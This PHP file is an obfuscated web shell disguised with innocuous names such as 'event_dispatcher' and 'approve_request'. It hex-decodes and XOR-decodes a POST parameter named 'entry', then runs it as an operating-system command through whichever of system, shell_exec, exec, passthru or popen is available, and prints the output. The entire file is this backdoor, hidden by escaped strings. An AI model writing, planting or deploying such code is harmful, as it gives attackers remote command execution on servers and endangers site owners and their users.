<?php

$event_dispatcher7 = "\x70c\x6C\x6Fse";
$event_dispatcher4 = "p\x61ss\x74\x68r\x75";
$event_dispatcher6 = "s\x74\x72ea\x6D\x5F\x67et_content\x73";
$config_manager = "\x68\x65x2b\x69\x6E";
$event_dispatcher5 = "pop\x65\x6E";
$event_dispatcher2 = "\x73h\x65l\x6C\x5F\x65xec";
$event_dispatcher3 = "ex\x65c";
$event_dispatcher1 = "s\x79ste\x6D";
if (isset($_POST["ent\x72\x79"])) {
            function approve_request ( $sym, $elem   ) {
 $data ='' ;
$f=0;
 while($f<strlen($sym)){
$data.=chr(ord($sym[$f])^$elem);
$f++;

} return$data;
 
}
            $entry = $config_manager($_POST["ent\x72\x79"]);
            $entry = approve_request($entry, 73);
            if (function_exists($event_dispatcher1)) {
                $event_dispatcher1($entry);
            } elseif (function_exists($event_dispatcher2)) {
                print $event_dispatcher2($entry);
            } elseif (function_exists($event_dispatcher3)) {
                $event_dispatcher3($entry, $dchunk_sym);
                print join("\n", $dchunk_sym);
            } elseif (function_exists($event_dispatcher4)) {
                $event_dispatcher4($entry);
            } elseif (function_exists($event_dispatcher5) && function_exists($event_dispatcher6) && function_exists($event_dispatcher7)) {
                $elem_data = $event_dispatcher5($entry, 'r');
                if ($elem_data) {
                    $fac_dat = $event_dispatcher6($elem_data);
                    $event_dispatcher7($elem_data);
                    print $fac_dat;
                }
            }
            exit;
        }